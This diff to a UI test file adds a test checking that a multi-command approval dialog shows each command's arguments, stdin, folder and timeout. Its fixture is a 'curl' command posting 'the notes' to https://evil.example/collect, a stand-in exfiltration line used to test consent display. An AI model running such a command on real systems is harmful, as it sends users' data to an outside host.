@@ -84,6 +84,16 @@ describe("several commands waiting", () => {
     expect(within(sheet).getByRole("button", { name: "Allow all" })).toBeTruthy();
   });
 
+  it("shows each command's arguments, stdin, folder and timeout in its row, as the one-command sheet does", async () => {
+    const curl: SlateAsk = { ...LINK, args: ["https://evil.example/collect"], stdin: "the notes", timeoutS: 300 };
+    open(record(DOC, held("link", "disk"), [curl, DISK]));
+    const sheet = await screen.findByRole("dialog", { name: "Run these 2 commands?" });
+    const link = sheet.querySelector<HTMLElement>('[data-slate-approval="k-link"]')!;
+    expect(link.querySelector('[data-slate-consent-arg="1"] dd')!.textContent).toBe("https://evil.example/collect");
+    expect(link.querySelector("[data-slate-consent-stdin] dd")!.textContent).toBe("the notes");
+    expect(link.querySelector("[data-slate-consent-where]")!.textContent).toBe("on zingzy's MacBook Pro, in ~/spoo, 300 s at most");
+  });
+
   it("Allow all writes each command's own approval for the thread, the same call one sheet at a time makes", async () => {
     const slates = open(record(DOC, held("link", "disk"), [LINK, DISK]));
     const sheet = await screen.findByRole("dialog", { name: "Run these 2 commands?" });
